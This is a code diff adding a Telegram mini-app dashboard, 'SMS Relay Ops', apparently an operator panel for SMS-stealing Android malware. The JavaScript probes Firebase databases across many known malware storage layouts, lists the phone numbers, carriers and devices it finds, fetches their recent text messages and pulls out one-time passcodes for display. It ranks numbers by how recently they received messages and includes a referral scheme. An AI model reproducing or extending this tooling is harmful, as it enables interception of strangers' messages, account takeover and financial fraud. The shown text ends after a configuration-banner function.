@@ -1,0 +1,1048 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover"/>
+<title>SMS Relay Ops — Dashboard</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');
+
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+
+:root{
+  --cyan:#00fff0;--green:#00ff88;--red:#ff3366;
+  --amber:#ffaa00;--purple:#bf00ff;--blue:#0088ff;
+  --bg:#06080f;--bg2:#0d1117;--card:#0f1520;
+  --border:rgba(0,255,240,0.11);
+  --text:#c9d1d9;--dim:rgba(255,255,255,0.32);
+}
+
+html,body{height:100%;background:var(--bg);color:var(--text);font-family:'Share Tech Mono','Courier New',monospace;overflow:hidden;}
+
+body::before{
+  content:'';position:fixed;inset:0;pointer-events:none;z-index:0;
+  background:
+    radial-gradient(ellipse 70% 35% at 30% 0%,rgba(0,255,240,0.045) 0%,transparent 70%),
+    radial-gradient(ellipse 50% 50% at 80% 90%,rgba(191,0,255,0.035) 0%,transparent 70%);
+}
+body::after{
+  content:'';position:fixed;inset:0;pointer-events:none;z-index:9999;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,240,0.011) 2px,rgba(0,255,240,0.011) 4px);
+}
+
+#app{position:relative;z-index:1;display:flex;flex-direction:column;height:100vh;}
+
+/* ── Topbar ── */
+.topbar{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:11px 16px;border-bottom:1px solid var(--border);
+  background:rgba(6,8,15,0.97);backdrop-filter:blur(10px);flex-shrink:0;
+}
+.topbar-logo{font-family:'Orbitron',monospace;font-size:10px;font-weight:900;letter-spacing:0.3em;color:var(--cyan);text-transform:uppercase;text-shadow:0 0 12px rgba(0,255,240,0.4);}
+.topbar-right{display:flex;align-items:center;gap:10px;}
+.live-badge{display:flex;align-items:center;gap:5px;font-size:8px;letter-spacing:0.2em;color:var(--green);background:rgba(0,255,136,0.07);border:1px solid rgba(0,255,136,0.2);padding:3px 8px;border-radius:2px;}
+.live-dot{width:5px;height:5px;border-radius:50%;background:var(--green);animation:blink 1.5s ease-in-out infinite;}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0.15}}
+.tick-counter{font-size:8px;letter-spacing:0.12em;color:var(--dim);}
+
+/* ── Content ── */
+.content{flex:1;overflow-y:auto;padding:14px 14px 80px;scroll-behavior:smooth;}
+.content::-webkit-scrollbar{width:2px;}
+.content::-webkit-scrollbar-thumb{background:rgba(0,255,240,0.2);border-radius:1px;}
+
+/* ── Bottom nav ── */
+.navbar{
+  position:fixed;bottom:0;left:0;right:0;
+  display:flex;background:rgba(6,8,15,0.98);
+  border-top:1px solid var(--border);backdrop-filter:blur(10px);z-index:100;
+}
+.nav-btn{
+  flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;
+  padding:9px 4px 11px;gap:3px;background:none;border:none;cursor:pointer;
+  color:rgba(255,255,255,0.25);font-family:'Share Tech Mono',monospace;
+  font-size:7.5px;letter-spacing:0.1em;text-transform:uppercase;transition:color 0.2s;
+  position:relative;
+}
+.nav-btn.active{color:var(--cyan);}
+.nav-btn.active::before{
+  content:'';position:absolute;top:0;left:15%;right:15%;height:1.5px;
+  background:var(--cyan);box-shadow:0 0 8px var(--cyan),0 0 16px rgba(0,255,240,0.3);
+}
+.nav-icon{font-size:18px;line-height:1;}
+
+/* ── Pages ── */
+.page{display:none;}
+.page.active{display:block;}
+
+/* ── Page title ── */
+.page-title{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;padding-bottom:10px;border-bottom:1px solid var(--border);}
+.page-title-text{font-family:'Orbitron',monospace;font-size:11px;font-weight:700;letter-spacing:0.25em;color:var(--cyan);text-transform:uppercase;}
+.page-title-meta{font-size:8px;letter-spacing:0.1em;color:var(--dim);}
+
+/* ── Cards ── */
+.card{background:linear-gradient(135deg,var(--card),rgba(10,14,22,0.9));border:1px solid var(--border);border-radius:4px;padding:14px;margin-bottom:10px;position:relative;overflow:hidden;}
+.card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(0,255,240,0.2),transparent);}
+.card-label{font-size:8.5px;letter-spacing:0.22em;color:var(--dim);text-transform:uppercase;margin-bottom:7px;}
+.card-value{font-family:'Orbitron',monospace;font-size:26px;font-weight:700;color:var(--cyan);line-height:1;}
+.card-sub{font-size:9px;color:var(--dim);margin-top:4px;letter-spacing:0.05em;}
+
+.g2{display:grid;grid-template-columns:1fr 1fr;gap:9px;margin-bottom:10px;}
+.g3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:9px;margin-bottom:10px;}
+.g2 .card,.g3 .card{margin-bottom:0;}
+.g3 .card-value{font-size:20px;}
+
+/* ── Section label ── */
+.section-lbl{font-size:8px;letter-spacing:0.25em;color:var(--dim);text-transform:uppercase;margin:18px 0 10px;display:flex;align-items:center;gap:8px;}
+.section-lbl::after{content:'';flex:1;height:1px;background:var(--border);}
+
+/* ── SMS feed items ── */
+.sms-item{background:var(--card);border:1px solid var(--border);border-radius:4px;padding:11px 12px;margin-bottom:7px;border-left:2.5px solid var(--cyan);transition:border-left-color 0.3s;}
+.sms-item.otp{border-left-color:var(--amber);}
+.sms-item-hdr{display:flex;justify-content:space-between;align-items:center;margin-bottom:5px;}
+.sms-phone{font-size:11px;color:var(--cyan);font-weight:600;}
+.sms-time{font-size:8.5px;color:var(--dim);}
+.sms-from{font-size:9px;color:var(--dim);margin-bottom:3px;}
+.sms-body{font-size:11.5px;color:var(--text);line-height:1.5;word-break:break-word;}
+.otp-badge{display:inline-block;margin-top:6px;background:rgba(255,170,0,0.1);border:1px solid rgba(255,170,0,0.28);color:var(--amber);font-size:8px;padding:2px 8px;border-radius:2px;letter-spacing:0.12em;}
+
+/* ── Number list ── */
+.num-item{background:var(--card);border:1px solid var(--border);border-radius:4px;padding:11px 12px;margin-bottom:7px;display:flex;align-items:center;gap:11px;cursor:pointer;transition:border-color 0.2s,background 0.2s;}
+.num-item:active{background:rgba(0,255,240,0.04);}
+.num-item.selected{border-color:rgba(0,255,240,0.35);background:rgba(0,255,240,0.04);}
+.status-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0;}
+.status-dot.hot,.status-dot.Active{background:var(--green);box-shadow:0 0 6px var(--green);}
+.status-dot.standby{background:var(--amber);}
+.status-dot.Inactive,.status-dot.offline{background:rgba(255,255,255,0.18);}
+.num-info{flex:1;min-width:0;}
+.num-phone{font-size:12px;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.num-meta{font-size:8.5px;color:var(--dim);margin-top:2px;letter-spacing:0.04em;}
+.num-arrow{font-size:12px;color:var(--dim);flex-shrink:0;}
+
+/* ── SMS monitor panel ── */
+.sms-monitor{position:fixed;inset:0;z-index:200;background:var(--bg);display:flex;flex-direction:column;}
+.sms-monitor.hidden{display:none;}
+.monitor-bar{display:flex;align-items:center;gap:12px;padding:12px 16px;border-bottom:1px solid var(--border);background:rgba(6,8,15,0.97);flex-shrink:0;}
+.monitor-back{background:none;border:none;color:var(--cyan);font-size:18px;cursor:pointer;padding:4px;}
+.monitor-title{flex:1;}
+.monitor-phone{font-family:'Orbitron',monospace;font-size:11px;color:var(--cyan);font-weight:700;}
+.monitor-sub{font-size:8px;color:var(--dim);margin-top:2px;}
+.monitor-status{display:flex;align-items:center;gap:5px;font-size:8px;color:var(--green);letter-spacing:0.1em;}
+.monitor-dot{width:5px;height:5px;border-radius:50%;background:var(--green);animation:blink 1s ease-in-out infinite;}
+.monitor-body{flex:1;overflow-y:auto;padding:14px;}
+.monitor-body::-webkit-scrollbar{width:2px;}
+
+/* ── Filter chips ── */
+.chips{display:flex;gap:6px;margin-bottom:12px;flex-wrap:wrap;}
+.chip{padding:4px 10px;border-radius:2px;font-size:8.5px;letter-spacing:0.12em;text-transform:uppercase;cursor:pointer;border:1px solid var(--border);background:transparent;color:var(--dim);font-family:'Share Tech Mono',monospace;transition:all 0.15s;}
+.chip.on{border-color:var(--cyan);color:var(--cyan);background:rgba(0,255,240,0.06);}
+
+/* ── Bar rows ── */
+.bar-row{margin-bottom:12px;}
+.bar-hdr{display:flex;justify-content:space-between;font-size:9.5px;margin-bottom:4px;}
+.bar-lbl{color:var(--dim);}
+.bar-cnt{color:var(--text);}
+.bar-track{height:3px;background:rgba(255,255,255,0.06);border-radius:2px;overflow:hidden;}
+.bar-fill{height:100%;border-radius:2px;transition:width 0.7s ease;}
+
+/* ── OTP codes ── */
+.otp-code-item{display:flex;align-items:center;justify-content:space-between;background:var(--card);border:1px solid rgba(255,170,0,0.18);border-radius:4px;padding:11px 14px;margin-bottom:7px;}
+.otp-number{font-family:'Orbitron',monospace;font-size:20px;font-weight:700;color:var(--amber);letter-spacing:0.3em;text-shadow:0 0 12px rgba(255,170,0,0.4);}
+.otp-meta{text-align:right;}
+.otp-from{font-size:9px;color:var(--dim);}
+.otp-time{font-size:8px;color:var(--dim);margin-top:2px;}
+
+/* ── Radar graphic ── */
+.radar-wrap{position:relative;width:200px;height:200px;margin:16px auto;display:flex;align-items:center;justify-content:center;}
+.radar-ring{position:absolute;border-radius:50%;border:1px solid rgba(0,255,240,0.15);}
+.radar-sweep{position:absolute;width:50%;height:1px;top:50%;left:50%;background:linear-gradient(90deg,rgba(0,255,240,0.6),transparent);transform-origin:0% 50%;animation:radar-spin 3s linear infinite;}
+@keyframes radar-spin{to{transform:rotate(360deg)}}
+.radar-center{width:6px;height:6px;border-radius:50%;background:var(--cyan);box-shadow:0 0 10px var(--cyan);position:relative;z-index:2;}
+.radar-blip{position:absolute;width:5px;height:5px;border-radius:50%;background:var(--amber);box-shadow:0 0 8px var(--amber);animation:blip-fade 3s ease-in-out infinite;}
+@keyframes blip-fade{0%,100%{opacity:0}40%,60%{opacity:1}}
+
+/* ── Referral ── */
+.ref-box{background:rgba(0,255,240,0.03);border:1px solid rgba(0,255,240,0.18);border-radius:4px;padding:22px 16px;text-align:center;margin-bottom:14px;}
+.ref-code{font-family:'Orbitron',monospace;font-size:22px;font-weight:900;color:var(--cyan);letter-spacing:0.25em;margin-bottom:8px;text-shadow:0 0 16px rgba(0,255,240,0.4);}
+.ref-link{font-size:9px;color:var(--dim);word-break:break-all;line-height:1.6;}
+.btn{width:100%;padding:12px;background:rgba(0,255,240,0.07);border:1px solid rgba(0,255,240,0.22);border-radius:3px;color:var(--cyan);font-family:'Share Tech Mono',monospace;font-size:11px;letter-spacing:0.15em;text-transform:uppercase;cursor:pointer;transition:all 0.2s;margin-bottom:9px;}
+.btn:hover{background:rgba(0,255,240,0.13);}
+.stat-row{display:flex;align-items:center;justify-content:space-between;padding:9px 0;border-bottom:1px solid var(--border);font-size:10.5px;}
+.stat-row:last-child{border-bottom:none;}
+.stat-key{color:var(--dim);}
+.stat-val{color:var(--text);font-weight:600;}
+
+/* ── Device guard ── */
+.device-block{font-size:9.5px;color:var(--dim);line-height:1.9;letter-spacing:0.04em;word-break:break-all;}
+.device-block strong{color:var(--cyan);}
+.status-pill{display:inline-flex;align-items:center;gap:6px;padding:6px 14px;border-radius:3px;font-size:10px;letter-spacing:0.12em;font-weight:700;text-transform:uppercase;margin:10px 0;}
+.status-pill.ok{background:rgba(0,255,136,0.08);border:1px solid rgba(0,255,136,0.22);color:var(--green);}
+.status-pill.warn{background:rgba(255,170,0,0.08);border:1px solid rgba(255,170,0,0.22);color:var(--amber);}
+.status-pill.bad{background:rgba(255,51,102,0.08);border:1px solid rgba(255,51,102,0.22);color:var(--red);}
+
+/* ── Loading / empty ── */
+.loading{text-align:center;padding:36px 20px;color:var(--dim);font-size:10px;letter-spacing:0.12em;}
+.spinner{width:28px;height:28px;border:1.5px solid rgba(0,255,240,0.1);border-top-color:var(--cyan);border-radius:50%;margin:0 auto 12px;animation:spin 0.9s linear infinite;}
+@keyframes spin{to{transform:rotate(360deg)}}
+.empty{text-align:center;padding:28px;color:var(--dim);font-size:10px;letter-spacing:0.1em;}
+
+/* ── Config banner ── */
+.config-banner{background:rgba(255,170,0,0.06);border:1px solid rgba(255,170,0,0.25);border-radius:4px;padding:12px 14px;margin-bottom:14px;font-size:9.5px;color:var(--amber);line-height:1.7;letter-spacing:0.04em;}
+.config-banner strong{color:var(--amber);}
+.config-banner code{font-size:8.5px;color:rgba(255,170,0,0.7);word-break:break-all;}
+
+/* ── Error toast ── */
+.toast{position:fixed;top:60px;left:50%;transform:translateX(-50%);background:rgba(255,51,102,0.1);border:1px solid rgba(255,51,102,0.3);color:var(--red);font-size:9px;letter-spacing:0.1em;padding:8px 16px;border-radius:3px;z-index:9999;display:none;max-width:90vw;text-align:center;}
+.toast.show{display:block;}
+</style>
+</head>
+<body>
+<div id="app">
+
+  <!-- Topbar -->
+  <div class="topbar">
+    <div class="topbar-logo">SMS Relay Ops</div>
+    <div class="topbar-right">
+      <div class="live-badge"><div class="live-dot"></div><span id="live-label">LIVE</span></div>
+      <div class="tick-counter" id="tick-label">5s</div>
+    </div>
+  </div>
+
+  <!-- Pages -->
+  <div class="content" id="main-content">
+    <div id="page-dash"    class="page active"></div>
+    <div id="page-nodes"   class="page"></div>
+    <div id="page-radar"   class="page"></div>
+    <div id="page-network" class="page"></div>
+    <div id="page-guard"   class="page"></div>
+  </div>
+
+  <!-- Bottom nav -->
+  <div class="navbar">
+    <button class="nav-btn active" id="nav-dash"    onclick="nav('dash',this)">   <span class="nav-icon">📊</span>Dash</button>
+    <button class="nav-btn"        id="nav-nodes"   onclick="nav('nodes',this)">  <span class="nav-icon">📱</span>Numbers</button>
+    <button class="nav-btn"        id="nav-radar"   onclick="nav('radar',this)">  <span class="nav-icon">🎯</span>Radar</button>
+    <button class="nav-btn"        id="nav-network" onclick="nav('network',this)"><span class="nav-icon">🔗</span>Referral</button>
+    <button class="nav-btn"        id="nav-guard"   onclick="nav('guard',this)">  <span class="nav-icon">🛡</span>Guard</button>
+  </div>
+</div>
+
+<!-- SMS Monitor fullscreen overlay -->
+<div class="sms-monitor hidden" id="sms-monitor">
+  <div class="monitor-bar">
+    <button class="monitor-back" onclick="closeMonitor()">←</button>
+    <div class="monitor-title">
+      <div class="monitor-phone" id="mon-phone">+91XXXXXXXXXX</div>
+      <div class="monitor-sub" id="mon-sub">Loading SMS path...</div>
+    </div>
+    <div class="monitor-status"><div class="monitor-dot"></div>LIVE · 5s</div>
+  </div>
+  <div class="monitor-body" id="mon-body">
+    <div class="loading"><div class="spinner"></div>Connecting to Firebase...</div>
+  </div>
+</div>
+
+<!-- Toast -->
+<div class="toast" id="toast"></div>
+
+<script>
+// ══════════════════════════════════════════════════════════════
+//  CONFIGURATION — paste your Firebase details here
+// ══════════════════════════════════════════════════════════════
+const FIREBASE_URL     = 'https://YOUR-PROJECT-DEFAULT-RTDB.firebaseio.com';  // ← your Firebase Realtime DB URL
+const FIREBASE_API_KEY = '';   // ← optional: your Firebase auth secret / legacy token
+const BOT_USERNAME     = 'YOUR_BOT_USERNAME';  // ← for referral deep links
+// ══════════════════════════════════════════════════════════════
+
+// ── Telegram WebApp ─────────────────────────────────────────
+const tg = window.Telegram?.WebApp;
+if (tg) { tg.ready(); tg.expand(); }
+const TG_ID        = tg?.initDataUnsafe?.user?.id?.toString() || 'demo';
+const TG_NAME      = tg?.initDataUnsafe?.user?.first_name || 'Operator';
+const TG_USERNAME  = tg?.initDataUnsafe?.user?.username  || '';
+
+// ── Runtime state ────────────────────────────────────────────
+let currentPage    = 'dash';
+let tickRemain     = 5;
+let numbers        = [];          // [{number, device_id, device_name, carrier, status, sms_path, struct_type}]
+let loadedSMS      = [];          // all SMS seen this session for radar/dash
+let monitorNumber  = null;        // currently monitored number entry
+let monitorTimer   = null;        // setInterval for 5s polling
+let isConfigured   = !FIREBASE_URL.includes('YOUR-PROJECT');
+
+// ── Firebase REST helper ─────────────────────────────────────
+const _FB_SYSTEM = new Set([
+  'rules','.settings','.info','users','user_data','user_sms','sms_forward',
+  'sms','messages','All_Users','firebase','metadata','clients','registeredDevices',
+  'smsLogs','fcm','fcmTokens','analytics','guard','bot_users','bot_state',
+  'login','account','profex_incoming','nextUserId','Favorites','backups',
+]);
+
+async function fbGet(path, params = '') {
+  const base = FIREBASE_URL.replace(/\/$/, '');
+  let url = base + path;
+  if (!url.includes('.json')) url = url.replace(/(\?|$)/, (m) => '.json' + (m === '?' ? '?' : ''));
+  // Force .json before query string
+  url = url.replace(/\.json(\?.*)?$/, (_, q) => '.json' + (q || ''));
+  if (FIREBASE_API_KEY) {
+    url += (url.includes('?') ? '&' : '?') + 'auth=' + FIREBASE_API_KEY;
+  }
+  if (params) url += (url.includes('?') ? '&' : '?') + params;
+  const res = await fetch(url, { signal: AbortSignal.timeout(10000) });
+  if (!res.ok) throw new Error('HTTP ' + res.status);
+  return res.json();
+}
+
+// ── SMS field normalisation ──────────────────────────────────
+const _BODY_F   = ['message','msg','body','Body','text','Text','sms','SMS','content'];
+const _SENDER_F = ['sender','Sender','from','From','address','Address','number','Number','phoneNumber','phone','source'];
+const _TIME_F   = ['timestamp','backupTime','date','datetime','dateTime','time','Time','receivedAt','received_at','sentAt','sentTime','created_at','createdAt'];
+
+function normSMS(entry) {
+  if (!entry || typeof entry !== 'object') return null;
+  const body   = _BODY_F.map(f => entry[f]).find(v => v && typeof v === 'string')?.trim() || '';
+  const sender = _SENDER_F.map(f => entry[f]).find(v => v && typeof v === 'string')?.trim() || 'Unknown';
+  const ts     = _TIME_F.map(f => entry[f]).find(v => v) || '';
+  if (!body) return null;
+  const otpM = body.match(/\b(\d{4,8})\b/);
+  return { body, sender, ts: String(ts), otp: otpM ? otpM[1] : null };
+}
+
+function parseTs(ts) {
+  if (!ts) return 0;
+  const s = String(ts).trim();
+  if (/^\d+$/.test(s)) {
+    let n = parseInt(s);
+    if (n > 1e12) n = Math.floor(n / 1000);
+    if (n > 1e9 && n < 9e9) return n;
+  }
+  const fmts = [
+    s => new Date(s).getTime() / 1000,
+  ];
+  for (const fn of fmts) {
+    try { const r = fn(s); if (r > 1e9) return r; } catch {}
+  }
+  return 0;
+}
+
+function fmtTime(ts) {
+  const t = parseTs(String(ts));
+  if (!t) return String(ts).slice(0,16);
+  return new Date(t * 1000).toLocaleTimeString([], { hour:'2-digit', minute:'2-digit', second:'2-digit' });
+}
+
+function fmtDate(ts) {
+  const t = parseTs(String(ts));
+  if (!t) return String(ts).slice(0,10);
+  return new Date(t * 1000).toLocaleDateString([], { month:'short', day:'numeric' });
+}
+
+// ── Get last N SMS from a node ───────────────────────────────
+function topNFromNode(node, n = 20) {
+  if (!node || typeof node !== 'object') return [];
+  const items = [];
+  for (const [k, v] of Object.entries(node)) {
+    if (typeof v !== 'object' || !v) continue;
+    const sms = normSMS(v);
+    if (!sms) continue;
+    items.push({ key: k, ts: parseTs(sms.ts), ...sms });
+  }
+  items.sort((a, b) => b.ts - a.ts || b.key.localeCompare(a.key));
+  return items.slice(0, n);
+}
+
+// ── Number discovery ─────────────────────────────────────────
+const _PH_F = ['phoneNumber','phone_number','phone','number','mobile','mobile_number','sim1Number','sim2Number','simNumber','SIM1','SIM2','sim1','sim2','mobileNumber'];
+const _CA_F = ['operator','network','carrier','simOperator','carrierName','sim1Provider','sim2Provider','sim1Operator','networkOperator','serviceProvider'];
+
+function extractPhone(node) {
+  if (!node || typeof node !== 'object') return '';
+  for (const f of _PH_F) {
+    const v = node[f];
+    if (v && typeof v === 'string') {
+      const d = v.split(' - ')[0].replace(/[^\d+]/g, '');
+      if (d.length >= 7) return d.startsWith('+') ? d : '+' + d;
+    }
+  }
+  // recurse simInfo
+  for (const k of ['simInfo','sim_info','SimInfo']) {
+    if (node[k] && typeof node[k] === 'object') {
+      const p = extractPhone(node[k]);
+      if (p) return p;
+    }
+  }
+  return '';
+}
+
+function extractCarrier(node) {
+  if (!node || typeof node !== 'object') return '';
+  for (const f of _CA_F) {
+    const v = node[f];
+    if (v && typeof v === 'string' && v.length > 1) return v.slice(0, 40);
+  }
+  for (const s of ['sim1','sim2','SIM1','SIM2']) {
+    const v = node[s];
+    if (typeof v === 'string' && v.includes(' - ')) return v.split(' - ').pop().slice(0, 40);
+  }
+  return '';
+}
+
+function statusFromNode(node) {
+  if (!node || typeof node !== 'object') return 'Active';
+  for (const f of ['status','Status','online','isOnline','active','Active']) {
+    const v = node[f];
+    if (v == null) continue;
+    const s = String(v).toLowerCase();
+    if (['offline','0','false','inactive','disconnected'].includes(s)) return 'Inactive';
+    if (['online','1','true','active','connected'].includes(s)) return 'Active';
+  }
+  return 'Active';
+}
+
+async function discoverNumbers() {
+  if (!isConfigured) return [];
+  try {
+    const root = await fbGet('/.json', 'shallow=true');
+    if (!root || typeof root !== 'object') return [];
+    const rootKeys = Object.keys(root).filter(k => !_FB_SYSTEM.has(k));
+
+    // Pattern G: user_data + user_sms
+    if (root.user_data) return await _parseG(rootKeys);
+    // Pattern H: messages + clients
+    if (root.messages || root.clients) return await _parseH();
+    // Pattern A2: All_Users/DeviceInfo
+    if (root.All_Users) {
+      const auSh = await fbGet('/All_Users/.json', 'shallow=true').catch(() => ({}));
+      if (auSh?.DeviceInfo)  return await _parseA2();
+      if (auSh?.simDetails)  return await _parseA3();
+      if (auSh?.sms)         return await _parseI();
+    }
+    // Pattern J: smsLogs + registeredDevices
+    if (root.smsLogs) return await _parseJ();
+    // Pattern A: {rootKey}/All_User
+    if (rootKeys.length > 0) return await _parseA(rootKeys);
+
+    return [];
+  } catch (e) {
+    console.error('discoverNumbers', e);
+    return [];
+  }
+}
+
+async function _parseG() {
+  try {
+    const sh = await fbGet('/user_data/.json', 'shallow=true');
+    if (!sh || typeof sh !== 'object') return [];
+    const devIds = Object.keys(sh).filter(k => !_FB_SYSTEM.has(k)).slice(0, 200);
+    const results = [];
+    for (const id of devIds) {
+      try {
+        const ud = await fbGet(`/user_data/${id}.json`);
+        const ph = extractPhone(ud || {});
+        results.push({
+          number: ph || `DEV-${id}`, device_id: id,
+          device_name: (ud?.d_name || ud?.device_name || id).slice(0, 40),
+          carrier: extractCarrier(ud || {}), status: statusFromNode(ud || {}),
+          sms_path: `/user_sms/${id}`, struct_type: 'G', is_ghost: !ph,
+        });
+      } catch {}
+    }
+    return results;
+  } catch { return []; }
+}
+
+async function _parseH() {
+  try {
+    const sh = await fbGet('/messages/.json', 'shallow=true').catch(() => ({}));
+    const csh = await fbGet('/clients/.json', 'shallow=true').catch(() => ({}));
+    const ids = new Set([...Object.keys(sh || {}), ...Object.keys(csh || {})].filter(k => !_FB_SYSTEM.has(k)));
+    const results = [];
+    for (const id of [...ids].slice(0, 200)) {
+      try {
+        const cl = (csh && csh[id]) ? await fbGet(`/clients/${id}.json`) : {};
+        const ph = extractPhone(cl || {});
+        results.push({
+          number: ph || `DEV-${id}`, device_id: id, device_name: id.slice(0, 40),
+          carrier: extractCarrier(cl || {}), status: statusFromNode(cl || {}),
+          sms_path: `/messages/${id}`, struct_type: 'H', is_ghost: !ph,
+        });
+      } catch {}
+    }
+    return results;
+  } catch { return []; }
+}
+
+async function _parseA2() {
+  try {
+    const sh = await fbGet('/All_Users/DeviceInfo/.json', 'shallow=true');
+    if (!sh) return [];
+    const results = [];
+    for (const id of Object.keys(sh).filter(k => !_FB_SYSTEM.has(k)).slice(0, 200)) {
+      try {
+        const di = await fbGet(`/All_Users/DeviceInfo/${id}.json`);
+        const ph = extractPhone(di || {});
+        results.push({
+          number: ph || `DEV-${id}`, device_id: id,
+          device_name: (di?.Model || di?.Brand || di?.model || id).slice(0, 40),
+          carrier: extractCarrier(di || {}), status: statusFromNode(di || {}),
+          sms_path: `/All_Users/sms/${id}`, struct_type: 'A2', is_ghost: !ph,
+        });
+      } catch {}
+    }
+    return results;
+  } catch { return []; }
+}
+
+async function _parseA3() {
+  try {
+    const sh = await fbGet('/All_Users/simDetails/.json', 'shallow=true');
+    if (!sh) return [];
+    const results = [];
+    for (const id of Object.keys(sh).filter(k => !_FB_SYSTEM.has(k)).slice(0, 200)) {
+      try {
+        const sd = await fbGet(`/All_Users/simDetails/${id}.json`) || {};
+        const ph = sd.sim1Number ? sd.sim1Number.replace(/[^\d+]/g, '') : extractPhone(sd);
+        const carrier = sd.sim1Provider || extractCarrier(sd);
+        results.push({
+          number: (ph && ph.length >= 7) ? (ph.startsWith('+') ? ph : '+' + ph) : `DEV-${id}`,
+          device_id: id, device_name: id.slice(0, 40),
+          carrier: carrier || '', status: 'Active',
+          sms_path: `/All_Users/sms/${id}`, struct_type: 'A3', is_ghost: !ph || ph.length < 7,
+        });
+      } catch {}
+    }
+    return results;
+  } catch { return []; }
+}
+
+async function _parseI() {
+  try {
+    const sh = await fbGet('/All_Users/sms/.json', 'shallow=true');
+    if (!sh) return [];
+    return Object.keys(sh).filter(k => !_FB_SYSTEM.has(k)).slice(0, 200).map(id => ({
+      number: `DEV-${id}`, device_id: id, device_name: id.slice(0, 40),
+      carrier: '', status: 'Active', sms_path: `/All_Users/sms/${id}`, struct_type: 'I', is_ghost: true,
+    }));
+  } catch { return []; }
+}
+
+async function _parseJ() {
+  try {
+    const sh = await fbGet('/smsLogs/.json', 'shallow=true');
+    if (!sh) return [];
+    const results = [];
+    for (const id of Object.keys(sh).filter(k => !_FB_SYSTEM.has(k)).slice(0, 200)) {
+      let ph = '';
+      try {
+        const node = await fbGet(`/smsLogs/${id}.json`, 'orderBy="$key"&limitToLast=3');
+        if (node && typeof node === 'object') {
+          for (const v of Object.values(node)) {
+            if (v && typeof v === 'object') {
+              const raw = v.receiverNumber || v.toNumber || '';
+              if (raw) { ph = raw.replace(/[^\d+]/g, ''); break; }
+            }
+          }
+        }
+      } catch {}
+      results.push({
+        number: ph ? (ph.startsWith('+') ? ph : '+' + ph) : `DEV-${id}`,
+        device_id: id, device_name: id.slice(0, 40),
+        carrier: '', status: 'Active', sms_path: `/smsLogs/${id}`, struct_type: 'J', is_ghost: !ph,
+      });
+    }
+    return results;
+  } catch { return []; }
+}
+
+async function _parseA(rootKeys) {
+  const results = [];
+  for (const rk of rootKeys.slice(0, 5)) {
+    try {
+      const simSh = await fbGet(`/${rk}/All_User/SimINFO/.json`, 'shallow=true').catch(() => null);
+      if (!simSh || typeof simSh !== 'object') continue;
+      for (const id of Object.keys(simSh).filter(k => !_FB_SYSTEM.has(k)).slice(0, 100)) {
+        try {
+          const sd = await fbGet(`/${rk}/All_User/SimINFO/${id}.json`) || {};
+          let ph = '';
+          for (const slot of ['sim1','sim2','SIM1','SIM2']) {
+            const raw = sd[slot];
+            if (raw && typeof raw === 'string') {
+              const d = raw.split(' - ')[0].replace(/[^\d+]/g, '');
+              if (d.length >= 7) { ph = d.startsWith('+') ? d : '+' + d; break; }
+            }
+          }
+          if (!ph) ph = extractPhone(sd);
+          results.push({
+            number: ph || `DEV-${id}`, device_id: id, device_name: id.slice(0, 40),
+            carrier: extractCarrier(sd), status: 'Active',
+            sms_path: `/${rk}/All_User/Sms/${id}`, struct_type: 'A', is_ghost: !ph,
+          });
+        } catch {}
+      }
+      if (results.length > 0) break;
+    } catch {}
+  }
+  return results;
+}
+
+// ── Fetch SMS for a given sms_path (latest N) ──────────────
+async function fetchSMSForPath(sms_path, n = 20) {
+  if (!sms_path) return [];
+  try {
+    const node = await fbGet(`${sms_path}.json`, `orderBy="$key"&limitToLast=${n}`);
+    return topNFromNode(node || {}, n);
+  } catch { return []; }
+}
+
+// ── Tier from last SMS timestamp ─────────────────────────────
+function tier(entry) {
+  if (!entry.last_sms_ts) return 'standby';
+  const age = Date.now() / 1000 - entry.last_sms_ts;
+  if (age < 7200)  return 'hot';
+  if (age < 86400) return 'standby';
+  return 'offline';
+}
+
+// ── Load numbers + enrich with last SMS time ─────────────────
+async function loadNumbers() {
+  if (!isConfigured) { numbers = []; return; }
+  showToast('Discovering numbers...');
+  try {
+    numbers = await discoverNumbers();
+    // Enrich with latest SMS timestamps (in small batches)
+    for (const n of numbers.filter(n => !n.is_ghost).slice(0, 50)) {
+      try {
+        const smsItems = await fetchSMSForPath(n.sms_path, 3);
+        if (smsItems.length > 0) n.last_sms_ts = smsItems[0].ts;
+      } catch {}
+    }
+    hideToast();
+  } catch (e) {
+    hideToast();
+    showToast('Failed to load numbers: ' + e.message, true);
+  }
+}
+
+// ── Navigation ───────────────────────────────────────────────
+function nav(page, btn) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById('page-' + page).classList.add('active');
+  btn.classList.add('active');
+  currentPage = page;
+  loadPage(page);
+}
+
+// ── Auto-refresh (5 seconds) ─────────────────────────────────
+setInterval(() => {
+  tickRemain--;
+  document.getElementById('tick-label').textContent = tickRemain + 's';
+  if (tickRemain <= 0) {
+    tickRemain = 5;
+    if (!monitorNumber) loadPage(currentPage);
+  }
+}, 1000);
+
+// ── Toast ─────────────────────────────────────────────────────
+function showToast(msg, err = false) {
+  const el = document.getElementById('toast');
+  el.textContent = msg;
+  el.className = 'toast show' + (err ? ' err' : '');
+  setTimeout(() => el.className = 'toast', err ? 4000 : 2000);
+}
+function hideToast() { document.getElementById('toast').className = 'toast'; }
+
+// ── Config check banner ───────────────────────────────────────
+function configBanner() {
+  if (isConfigured) return '';
+  return `<div class="config-banner">
+    <strong>⚠ Firebase not configured</strong><br>
+    Open <code>dashboard.html</code> and set:<br>
+    <code>FIREBASE_URL</code> — your Firebase Realtime DB URL<br>
+    <code>FIREBASE_API_KEY</code> — your auth secret (if required)
+  </div>`;
+}
+
